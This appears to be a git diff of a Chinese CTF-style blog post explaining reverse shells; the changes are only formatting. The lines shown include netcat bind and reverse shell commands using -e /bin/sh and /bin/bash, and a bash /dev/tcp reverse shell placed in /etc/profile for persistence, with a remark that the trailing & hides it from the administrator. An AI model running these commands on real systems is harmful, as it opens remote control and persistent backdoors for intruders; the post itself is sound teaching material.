@@ -4,9 +4,7 @@ date: 2022-03-29 11:15:00
 updated: 2022-03-29 11:15:00
 tags: [ctf,security]
 description: reverse shell
-archive: false
 ---
-
 # 浅谈如何反弹shell
 
 ## linux下常见网络工具🧀
@@ -45,13 +43,13 @@ telnet协议是TCP/IP协议族的其中之一，是Internet远端登录服务的
 
 **目标主机：**
 
-命令：`nc  -lvp  Targert_Port  -e  /bin/sh  `
+命令：`nc  -lvp  Targert_Port  -e  /bin/sh`
 
 ![image-20220329101019243](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220329101019243.png)
 
 **本地主机：**
 
-命令：`nc  Targert_IP  Targert_Port `
+命令：`nc  Targert_IP  Targert_Port`
 
 ![image-20220329101103804](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220329101103804.png)
 
@@ -61,9 +59,9 @@ telnet协议是TCP/IP协议族的其中之一，是Internet远端登录服务的
 >
 >参考:
 >
->https://xz.aliyun.com/t/9488
+><https://xz.aliyun.com/t/9488>
 >
->https://zhuanlan.zhihu.com/p/138393396
+><https://zhuanlan.zhihu.com/p/138393396>
 
 反弹shell（reverse shell），就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。
 
@@ -91,7 +89,7 @@ telnet协议是TCP/IP协议族的其中之一，是Internet远端登录服务的
 
 -lvp中l指监听，v指输出交互过程，p为指定端口
 
-靶机连接攻击机:`netcat Target_IP Target_Port -e /bin/bash `
+靶机连接攻击机:`netcat Target_IP Target_Port -e /bin/bash`
 
 ![image-20220329104342323](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220329104342323.png)
 
@@ -149,11 +147,6 @@ Bash产生了一个交互环境和本地主机主动发起与攻击机端口建�
 
 将反弹shell的命写入/etc/profile文件中，/etc/profile中的内容会在用户打开bash窗口时执行。
 
-`/bin/bash -i >& /dev/tcp/Target_IP/Target_Port 0>&1 & `
+`/bin/bash -i >& /dev/tcp/Target_IP/Target_Port 0>&1 &`
 
  最后面那个&为的是防止管理员无法输入命令
-
-
-
-
-
